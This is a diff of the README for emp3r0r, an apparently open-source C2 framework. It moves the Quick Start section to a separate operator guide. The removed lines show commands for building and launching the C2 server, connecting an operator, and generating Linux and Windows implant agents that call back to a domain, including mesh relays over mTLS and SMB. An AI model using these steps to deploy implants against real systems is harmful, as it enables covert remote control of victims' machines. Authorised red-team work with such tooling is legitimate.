@@ -191,73 +191,16 @@ Every unused subsystem is another dependency and another string for a defender t
 
 ## Quick Start
 
-### 1. C2 Server Installation
-
-Building emp3r0r requires Docker or Podman on the host — no local Go toolchain.
-
-```bash
-git clone --depth=1 https://github.com/jm33-m0/emp3r0r.git && cd emp3r0r
-./install.py
-```
-
-The installer builds everything in a throwaway container and prepares the operator kit. Useful flags: `--lightweight` (Linux/Windows amd64 only, fastest), `--targets OS/ARCH,...`, `--agent-slim` / `--agent-tags` (trim agent features to shrink the implant and reduce fingerprinting), `--debug`, `--skip-build`.
-
-Launch the server:
-
-```bash
-emp3r0r server --c2-hosts 1.2.3.4 --http-port 12345 --operator-port 13377
-```
-
-### 2. Operator Machine Setup
-
-```bash
-tar --zstd -xpf emp3r0r-operator-kit.tar.zst
-cd ./emp3r0r-operator-kit && ./install.py
-```
-
-Connect using the WireGuard credentials the server printed:
-
-```bash
-emp3r0r client --c2-port 13377 \
-  --server-wg-key '<SERVER_WG_KEY>' --server-wg-ip '<SERVER_WG_IP>' \
-  --operator-wg-ip '<OPERATOR_WG_IP>' --operator-wg-key '<OPERATOR_WG_KEY>' \
-  --c2-host 1.2.3.4
-```
-
-### 3. Generate Agent Payloads
-
-Inside the operator console:
-
-```bash
-# Direct C2 agent
-generate --type linux_executable --arch amd64 --cc your.domain.com
-
-# Mesh gateway agent (also reachable from the C2 directly)
-generate --type linux_executable --arch amd64 --cc your.domain.com \
-  --p2p --direct-c2 --p2p-transport mtls
-
-# Mesh intermediate peer (relays for other agents)
-generate --type linux_executable --arch amd64 --cc your.domain.com \
-  --p2p --p2p-transport mtls --peers 1.2.3.4
-
-# Windows mesh peer over SMB named pipes (local \\.\pipe, cross-host \\host\pipe),
-# AES-GCM framed like the other transports
-# (requires the Windows SMB stack / logon session to reach the peer)
-generate --type windows_executable --arch amd64 --cc your.domain.com \
-  --p2p --p2p-transport smb
-```
-
-Mesh nodes may run different transports. Each agent advertises the transport and
-port its relay listens on, and dialers always use the _peer's_ advertised
-transport, so a mixed mesh (for example Windows SMB nodes alongside Linux mTLS
-nodes) routes through a peer that shares a usable transport instead of assuming
-everyone runs the local default. `smb` is only accepted for Windows payloads;
-kcp/mtls work everywhere.
+See **[OPERATOR.md](./OPERATOR.md)** for the full deployment and operator guide:
+C2 server installation, operator setup (native Linux or the recommended Windows
+container), container capabilities, tmux keybindings and agent payload
+generation.
 
 ---
 
 ## Documentation & Resources
 
+- 🖥️ **Operator Guide:** [OPERATOR.md](./OPERATOR.md)
 - 🛠️ **Module Development Guide:** [core/modules/module_development_guide.md](./core/modules/module_development_guide.md)
 - 🧪 **Testing Guide:** [TESTING.md](./TESTING.md)
 - 📝 **Security Policy:** [SECURITY.md](./SECURITY.md)
